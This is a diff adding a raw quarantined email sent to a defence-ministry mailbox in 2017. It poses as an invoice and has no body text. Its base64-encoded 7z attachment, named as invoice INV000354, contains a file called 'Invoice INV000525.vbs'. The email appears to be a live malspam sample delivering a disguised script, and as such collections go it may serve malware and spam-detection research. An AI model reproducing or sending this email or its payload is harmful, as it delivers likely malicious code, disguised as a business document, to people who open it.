@@ -1,0 +1,99 @@
+Return-Path: <rudy@quick-foto.ch>
+Delivered-To: spam-quarantine
+X-Envelope-To: <milcoop@mod.mil.by>
+Received-SPF: Neutral (access neither permitted nor denied) identity=mailfrom; client-ip=177.243.169.115; helo=customer-gto-169-115.megared.net.mx; envelope-from=rudy@quick-foto.ch; receiver=milcoop@mod.mil.by 
+Authentication-Results: mail.mod.mil.by; dmarc=none (p=none dis=none) header.from=quick-foto.ch
+Authentication-Results: mail.mod.mil.by; dkim=none reason="no signature";
+	dkim-adsp=none (unprotected policy); dkim-atps=neutral
+Received: from customer-GTO-169-115.megared.net.mx (unknown [177.243.169.115])
+	by mail.mod.mil.by (Microsoft SMTP Server id 8.1.436.0) with ESMTP id E092CB2EF
+	for <milcoop@mod.mil.by>; Thu,  5 Oct 2017 18:25:31 +0300 (+03)
+Content-Type: multipart/mixed;
+      boundary="Apple-Mail-D0D2858B-860E-5578-C423-7E52C6416A15"
+Content-Transfer-Encoding: 7bit
+From: Rudy Foxcraft <rudy@quick-foto.ch>
+Date: Thu, 05 Oct 2017 10:25:26 -0500
+Subject: Invoice INV000354
+Message-ID: <1491AF6E-8409-5DEA-238F-4044036B1ADE@quick-foto.ch>
+To: <milcoop@mod.mil.by>
+X-Mailer: iPhone Mail (14D27)
+MIME-Version: 1.0
+
+--Apple-Mail-D0D2858B-860E-5578-C423-7E52C6416A15
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+
+
+--Apple-Mail-D0D2858B-860E-5578-C423-7E52C6416A15
+Content-Type: application/octet-stream; name="Invoice INV000354.7z";
+      x-apple-part-url=63134C68-1BAC-3FE4-8C9E-8D35AF0971D4
+Content-Disposition: attachment; filename="Invoice INV000354.7z"
+Content-Transfer-Encoding: base64
+
+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
+CgEAABVNGeo90wEVBgEAgAAAAAAA
+
+--Apple-Mail-D0D2858B-860E-5578-C423-7E52C6416A15
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+
+
+
+Sent from my iPhone
+--Apple-Mail-D0D2858B-860E-5578-C423-7E52C6416A15--
